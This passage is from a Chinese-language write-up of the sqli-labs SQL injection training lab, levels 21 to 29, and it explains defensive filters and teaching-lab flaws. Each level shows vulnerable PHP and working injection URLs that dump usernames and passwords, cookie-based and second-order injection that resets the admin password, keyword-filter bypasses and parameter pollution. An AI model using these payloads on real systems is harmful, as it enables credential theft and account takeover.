输出 mysql_error()</span><br><span class="line">        <span class="keyword">if</span> 有结果:</span><br><span class="line">            输出查询的信息</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">        setcookie(<span class="string">&#x27;uname&#x27;</span>, base64_encode(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), time()<span class="number">-3600</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过源码看出，后端会把传入的cookie中的<code>uname</code>参数进行base64解密，然后再进行查询，所以我们传入的cookie中的<code>uname</code>要尽心base64加密才行。同时注意到，这里的闭合方式为<code>(&#39;$uname&#39;)</code></p>
<p>查询语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;sqlsec&#39;) union select 1,2,(SELECT GROUP_CONCAT(username,&#39;:&#39;,password) FROM users)#</span><br></pre></td></tr></table></figure>
<p>我们可以利用hackbar进行base64加密：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;c3Fsc2VjJykgdW5pb24gc2VsZWN0IDEsMiwoU0VMRUNUIEdST1VQX0NPTkNBVCh1c2VybmFtZSwnOicscGFzc3dvcmQpIEZST00gdXNlcnMpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304212001660.png" alt="image-20210304212001660"></p>
<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><ul>
<li>查看源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = base64_decode(<span class="variable">$cookee</span>);</span><br><span class="line"><span class="variable">$cookee1</span> = <span class="string">&#x27;&quot;&#x27;</span>. <span class="variable">$cookee</span>. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=<span class="subst">$cookee1</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>可以看出仅仅实在Less-21的基础上把闭合方式改为了<code>&quot;$cookee1&quot;</code>，注入方式参考Less-21</p>
<h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><ul>
<li>查看源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> 有查询结果:</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
<p>可以看出这里使用正则匹配过滤了<code>#</code>和<code>--</code>，导致了我们无法把查询语句中参数<code>$id</code>后面的限制仅输出1个内容给屏蔽掉。这里我们可以构造语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(username,&#39;:&#39;,password) from users),&#39;3</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304215528582.png" alt="image-20210304215528582"></p>
<p>解释：</p>
<ol>
<li><p>首先是id的第一个参数为-1，因为 sql 语句执行了两个 select 语句，第一个 select 为 id 的选择语 句，第二个为我们构造的 select 语句。只有一个数据可以输出，为了让我们自己构造的数据 可以正常输出，第一个 select 要没有结果，所以-1 或者超过数据库所有数据都可以。</p>
</li>
<li><p>最后3前面的<code>&#39;</code>目的是闭合查询语句最后的<code>&#39;</code>，使其不会错误</p>
</li>
<li><p>此处也可以进行报错注入，盲注</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select extractvalue(1,concat(0x7e,(select database()),0x7e))),&#39;3</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304215543764.png" alt="image-20210304215543764"></p>
<h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><ul>
<li><p>查看代码</p>
<ul>
<li><strong>Index.php</strong></li>
</ul>
<p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了。</p>
<p>输入用户名和密码之后会把数据传输到 <strong>login.php</strong> 进行验证。点击忘记密码会跳转到<strong>forgot_password.php</strong>，点击创建新用户会跳转到<strong>new_user.php</strong>。</p>
<ul>
<li><strong>failed.php</strong></li>
</ul>
<p>检测会话，如果 cookie 里面没有 Auth 参数的话，就跳转到 index.php</p>
<ul>
<li><strong>forgot_password.php</strong></li>
</ul>
<p>简单提示：如果你忘记密码 请 hack it</p>
<ul>
<li><strong>login.php</strong></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 登陆成功：</span><br><span class="line">    <span class="comment">#设置session和cookie</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$login</span>;</span><br><span class="line">    setcookie(<span class="string">&quot;Auth&quot;</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure>
<p><code>$username</code>和<code>$password</code>两个参数都被过滤掉，无法从这里进行注入。</p>
<ul>
<li><strong>new_user.php</strong></li>
</ul>
<p>创建新用户的表单页面，本文件主要存放前段代码。</p>
<ul>
<li><strong>login_create.php</strong></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 接受用户提交的用户名和密码值 并进行 mysql 安全函数转义</span></span><br><span class="line"><span class="variable">$username</span>=  mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询当前用户信息</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">#如果当前用户已经存在 无法注册</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 两次输入密码一致：</span><br><span class="line">  <span class="comment"># 将记录插入数据库中</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="subst">$username</span>\&quot;, \&quot;<span class="subst">$pass</span>\&quot;)&quot;</span>;</span><br><span class="line">      查询完成后 重定向到首页</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        提示两次输入密码不一致</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>pass_change.php</strong></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 检测未登录：</span><br><span class="line">    重定向到首页</span><br><span class="line"><span class="keyword">if</span> 检测到提交表单：</span><br><span class="line">  <span class="comment"># 对 pass 都进行了过滤</span></span><br><span class="line">  <span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> 两次密码一致:</span><br><span class="line">        <span class="comment"># 直接将 username 拼接到 SQL 语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        提示密码不一致 并重定向到 fail.php</span><br></pre></td></tr></table></figure></li>
<li><p>思路分析</p>
</li>
</ul>
<p>这里需要利用到二次注入。看更新密码的地方：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username=<span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username 的值为：<code>admin&#39;#</code>，那么此时的完整语句就为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username=<span class="string">&#x27;admin&#x27;</span><span class="comment"># and password=&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure>
<p>相当于<code>#</code>后面的都被屏蔽掉了，直接修改了 admin 的用户密码。</p>
<ul>
<li><p>演示步骤</p>
<ol>
<li><p>注册一个名字为<code>admin&#39;#</code>的用户</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305100428917.png" alt="image-20210305100428917"></p>
</li>
<li><p>注册好之后登陆该账户，对密码进行修改</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305100925703.png" alt="image-20210305100925703"></p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305100819324.png" alt="image-20210305100819324"></p>
</li>
</ul>
<p>可以看到此时admin用户的密码被修改为了000</p>
<h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><ul>
<li>查看代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>= blacklist(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>  可以看出后端把传进去的参数进行了过滤，把<code>or</code>和<code>and</code>不区分大小写替换为了空字符。</p>
<ul>
<li>or 和 and 过滤的绕过<ol>
<li>大小写变形 Or,OR,oR</li>
<li>编码，hex，urlencode</li>
<li>添加注释/*or*/</li>
<li>利用符号 and=&amp;&amp; or=||</li>
<li>双写 oorr，anandd</li>
</ol>
</li>
</ul>
<p>由于password中含有or，所以要在里面双写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(username,&#39;:&#39;,passwoorrd) from users),3--+</span><br></pre></td></tr></table></figure>
<p>使用报错或者盲注时推荐使用符号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;||extractvalue(1,concat(0x7e,database()))--+</span><br></pre></td></tr></table></figure>
<blockquote>
<p>值得一提的是，如果使用&amp;&amp;来代替and，需要对&amp;&amp;进行url编码，否则&amp;后面的内容会被当成第二个参数传递。</p>
</blockquote>
<h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p>这一关就是Less-25的小改，参数类型改为了数字型，并且屏蔽了错误信息显示。因此这里只能使用联合注入和盲注。</p>
<h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><ul>
<li>查看源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  这里过滤规则变多了，把 or，and，/*，#，–，/和空格给过滤掉 </p>
<ul>
<li><p>绕过方法</p>
<ul>
<li>之前已经提过and，or和注释符被过滤时候的绕过方法，这里不再赘述</li>
<li>空格被过滤可以使用如下的符号来代替</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="left">符号</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%09</td>
<td align="left">TAB 键(水平)</td>
</tr>
<tr>
<td align="left">%0a</td>
<td align="left">新建一行</td>
</tr>
<tr>
<td align="left">%0c</td>
<td align="left">新的一页</td>
</tr>
<tr>
<td align="left">%0d</td>
<td align="left">return 功能</td>
</tr>
<tr>
<td align="left">%0b</td>
<td align="left">TAB 键(垂直)</td>
</tr>
<tr>
<td align="left">%a0</td>
<td align="left">空格</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ea678630a8ac651042f1a6ce703956a2.n2.vsgo.cloud:14562&#x2F;sqlilabs&#x2F;Less-26&#x2F;</span><br><span class="line">?id&#x3D;100&#39;%0bunion%0bselect%0b1,(select%0bgroup_concat(username,&#39;:&#39;,passwoorrd)%0bfrom%0busers),3||&#39;1</span><br></pre></td></tr></table></figure>
<blockquote>
<p>该方法无法再window上实现，因为有些符号不能被解析,这里借助了在线容器进行测试</p>
<p><a class="link"   href="https://www.vsplate.com/labs.php" >https://www.vsplate.com/labs.php<i class="fas fa-external-link-alt"></i></a></p>
</blockquote>
<h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>与 Less-26 相比，只是拼接方式改为了<code>(&#39;$id&#39;)</code>，因为没有输出报错信息，所以不能使用报错注入了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ea678630a8ac651042f1a6ce703956a2.n2.vsgo.cloud:14562&#x2F;sqlilabs&#x2F;Less-26a&#x2F;</span><br><span class="line">?id&#x3D;100&#39;)%0bunion%0bselect%0b1,(select%0bgroup_concat(username,&#39;:&#39;,passwoorrd)%0bfrom%0busers),3||(&#39;1</span><br></pre></td></tr></table></figure>


<h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><ul>
<li>查看源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br></pre></td></tr></table></figure>
<p>这里解释一下正则匹配修饰符的含义：</p>
<table>
<thead>
<tr>
<th>模式修正符号</th>
<th>功能描述</th>
</tr>
</thead>
<tbody><tr>
<td>i</td>
<td>在和正则匹配是不区分大小写</td>
</tr>
<tr>
<td>m</td>
<td>将字符串视为多行。(具体作用就是防止双写绕过)</td>
</tr>
<tr>
<td>s</td>
<td>如果设定了这个修正符，那么，被匹配的字符串将视为一行来看，包括换行符，换行符将被视为普通字符串。</td>
</tr>
</tbody></table>
<p>通过源码我们知道了后端对那些字符进行了过滤，虽然这里对<code>union</code>和<code>select</code>做了部分过滤，但是任然存在可以绕过的漏洞。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-27&#x2F;</span><br><span class="line">?id&#x3D;100&#39;unIon%0bSelEcT%0b1,database(),&#39;3</span><br></pre></td></tr></table></figure>


<h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>这关在Less-27的基础上，把闭合方式改为<code>&quot;$id&quot;</code>，同时屏蔽了错误信息显示，因此无法进行报错注入。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-27a&#x2F;</span><br><span class="line">?id&#x3D;100&quot;unIon%0bSelEcT%0b1,database(),&quot;3</span><br></pre></td></tr></table></figure>


<h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><ul>
<li>查看源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);					<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br></pre></td></tr></table></figure>
<p>闭合方式为<code>(&#39;$id&#39;)</code>，，并且取消了select不能双写的限制，增加了对<code>union select</code>连在一起的时候且不区分大小写的过滤，且屏蔽了错误信息显示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-28&#x2F;</span><br><span class="line">?id&#x3D;100&#39;)uniunion%0bselecton%0bselect%0b1,database(),(&#39;3</span><br></pre></td></tr></table></figure>


<h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>本关在less-28的基础上竟然还少了前面的几个限制，只留下了最后一个对<code>union select</code>的过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-28a&#x2F;</span><br><span class="line">?id&#x3D;100&#39;) uniunion selecton select 1,database(),(&#39;3</span><br></pre></td></tr></table></figure>


<h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><ul>
<li><p>查看源码</p>
<ul>
<li>index.php</li>
</ul>
<p>并没有什么特别的，平平无奇，使用联合注入即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-29&#x2F;</span><br><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users) --+</span><br></pre></td></tr></table></figure>
<ul>
<li>login.php</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$qs</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="variable">$id1</span>=java_implimentation(<span class="variable">$qs</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//echo $id1;</span></span><br><span class="line">whitelist(<span class="variable">$id1</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$match</span> = preg_match(<span class="string">&quot;/^\d+$/&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">		<span class="comment">//return $match;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	</span><br><span class="line">		header(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">		<span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= explode(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$val</span>=substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$id_value</span>=substr(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里面有2个函数，<strong>java_implimentation</strong>的作用是将传入的参数以<code>&amp;</code>分隔，如果该参数的前两个字符为<code>id</code>，则取它的第三个字符开始的30个字符作为<code>$id_value</code>，并返回<code>$id_value</code>，同时跳出循环。<strong>whitelist</strong>的作用是检查传入的字符串是否是数字，是的话就直接返回该字符串，否则就跳转到hacked.php。</p>
</li>
<li><p>利用方式</p>
</li>
</ul>
<p>由于<strong>java_implimentation</strong>函数只要检测到一个<code>id</code>参数就退出检测，那么当我们传入2个名为<code>id</code>的参数时，后面的那一个就能绕过检测，从而可以利用其来进行注入。那么问题是，我们后端使用<code>$id=$_GET[&#39;id&#39;];</code>获取到的<code>id</code>参数究竟是第一个还是第二个呢。假设用户输入这样的语句：</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?id=<span class="number">1</span>&amp;id=<span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>  Apache PHP 会解析最后一个参数</p>
<p>  Tomcat JSP 会解析第一个参数</p>
<p>可以看出，我们可以构造第二个<code>id</code>参数来绕过检测。</p>
